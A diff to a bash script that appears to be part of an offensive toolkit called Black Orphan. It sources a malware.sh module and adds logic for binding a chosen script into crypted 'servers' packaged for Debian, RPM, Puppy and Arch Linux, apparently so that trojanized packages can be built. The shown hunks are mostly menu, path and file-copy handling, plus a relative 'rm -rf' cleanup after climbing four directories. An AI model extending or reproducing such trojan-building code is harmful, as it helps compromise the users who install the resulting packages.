@@ -27,9 +27,9 @@
 ##
 #############################################################################
 ################################     VARIABLES	 ############################
-source misc/globals.sh
-source misc/utils.sh    
-source misc/malware.sh
+source ${PWD}/misc/globals.sh
+source ${PWD}/misc/utils.sh    
+source ${PWD}/misc/malware.sh
 
 [ ! -o xpg_echo ] && shopt -s xpg_echo
 
@@ -43,8 +43,8 @@ is_root() {
     }
 }
 header() {
-    reset
-    <<'EOF'
+    reset 
+    cat <<'EOF'
 
  ____  _            _     ___             _
 | __ )| | __ _  ___| | __/ _ \ _ __ _ __ | |__   __ _ _ __
@@ -76,10 +76,7 @@ about(){
     printf "%s\n\n" "Copyright 2015 BLACK ORPHAN"
     printf "Written by: %s\n\nTeam: %s\n\nEmail: %s\n\n" "$author" "$team" "$eaddress"
     printf "%s\n\n" "####REQUIREMENT"
-    #printf "* Shc\n"
-    #printf "* Netcat\n"
-    #printf "* Socat\n"
-    #printf "* Brain\n\n"
+
 
     printf "%s\n" "* shc"
     printf "%s\n" "* tcl"
@@ -164,60 +161,67 @@ _select(){
 chk_file() {
     # Crypt the script
     local fileExt
+    
     source ${CRYPT}/misc/crypt.sh
     source ${CRYPT}/misc/scriptconfig.sh
-    while :;do
-
-	printf "${open}${bold}${green}Specify script to bind with: ${close}" ; read -e bindscript
-	printf "\n"
-	if [[ -z "$bindscript" ]];then
-	    printf "${open}${bold}${red}%s${close}\n" "[!]Specify absolute Path to Script to bind with"
-	    continue
-	fi
-	
-	if [[ ! -e "${bindscript}" ]];then
-	    printf "${open}${bold}${red}${bindscript} %s${close}\n" "Does not exist"
-	    continue
-	elif [[ ! -f "${bindscript}" ]];then
-	    printf "${open}${bold}${red}%s${close}\n" "${bindscript} Is not a file"
-	    continue
-	fi
-	
-	env='#!'"$(which env)"
-	declare -a bangArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which tmux)" "$(which tcsh)" "$(which perl)" "$(which python)" )
-
-	
-	
-	for i in "${bangArray[@]}"
-	do
-	    #echo "#!${i}" > /dev/null 2>&1
-	    head -1 "${bindscript}" | egrep -qo "#\!$i|$env.$i" #>/dev/null 2>&1
-	    if [[ $? == 0 ]];then
-		break 2
+    if [[ "${dirfile}" != "tempScript.sh" ]];then
+	while :;do
+	    
+	    printf "${open}${bold}${green}Specify script to bind with: ${close}" ; read -e bindscript
+	    printf "\n"
+	    if [[ -z "$bindscript" ]];then
+		printf "${open}${bold}${red}%s${close}\n" "[!]Specify absolute Path to Script to bind with"
+		continue
 	    fi
 	    
+	    if [[ ! -e "${bindscript}" ]];then
+		printf "${open}${bold}${red}${bindscript} %s${close}\n" "Does not exist"
+		continue
+	    elif [[ ! -f "${bindscript}" ]];then
+		printf "${open}${bold}${red}%s${close}\n" "${bindscript} Is not a file"
+		continue
+	    fi
+	    
+	    env='#!'"$(which env)"
+	    declare -a bangArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which tmux)" "$(which tcsh)" "$(which perl)" "$(which python)" )
+	    
+	    
+	    
+	    for i in "${bangArray[@]}"
+	    do
+		#echo "#!${i}" > /dev/null 2>&1
+		head -1 "${bindscript}" | egrep -qo "#\!$i|$env.$i" #>/dev/null 2>&1
+		if [[ $? == 0 ]];then
+		    break 2
+		fi
+		
+	    done
+	    
+	
+	    printf "${open}${bold}${red}%s${close}\n" "Hash bang is required in ${bindscript##*/}"
+	    
+	    if [[ -z "${dirfile}" ]];then
+		break ;
+	    fi
+	    cd ../../../../ && rm -rf "$dirfile"
+	    
+	    exit 2
+	    
 	done
-	
-	
-	printf "${open}${bold}${red}%s${close}\n" "Hash bang is required in ${bindscript##*/}"
-
-	
-	cd ../../../../ && rm -rf "$dirfile"
-	
-	exit 2
-	
-    done
+    else
+	bindscript="${dirfile}"
+    fi
     
     fileExt=${bindscript##*.} ;# get the file extension
 
-    cp "${bindscript}" "$(pwd)" 
+    [[ "${dirfile}" != "tempScript.sh" ]] && cp "${bindscript}" "$(pwd)" 
     
+
     fileName=${bindscript%%.*}
     fileName=${fileName##*/}
 
-    echo "${fileName}"
-    mv "${bindscript}" "${fileName}"
-
+    cp "${bindscript}" "${fileName}" 
+    
     scrConfig "${fileExt}"
 
 }
@@ -321,27 +325,28 @@ createserver(){
     createserver_banner
     while printf "${open}${light}${green}%s${close} " "${createserver}" ; read $opt -e cserversel
     do
+	printf "\n"
 	case $cserversel in
-	    1)  echo ""
+	    1) 
 		hungerGames="$cserversel"
 		pPackage="debian"
 		cservprompt="${PS2}:create_server:debian_base"
 		general
 
 		;;
-	    2)  echo ""
+	    2) 
 		hungerGames="$cserversel"
 		pPackage="rpm"
 		cservprompt="${PS2}:create_server:rpm_base"
 		general
 		;;
-	    3)  echo ""
+	    3) 
 		hungerGames="$cserversel"
 		pPackage="pet(puppy LInux)"
 		cservprompt="${PS2}:create_server:puppy_linux"
 		general
 		;;
-	    4)  echo ""
+	    4)  
 		hungerGames="$cserversel"
 		pPackage="ArchLinux"
 		cservprompt="${PS2}:create_server:arch_linux"
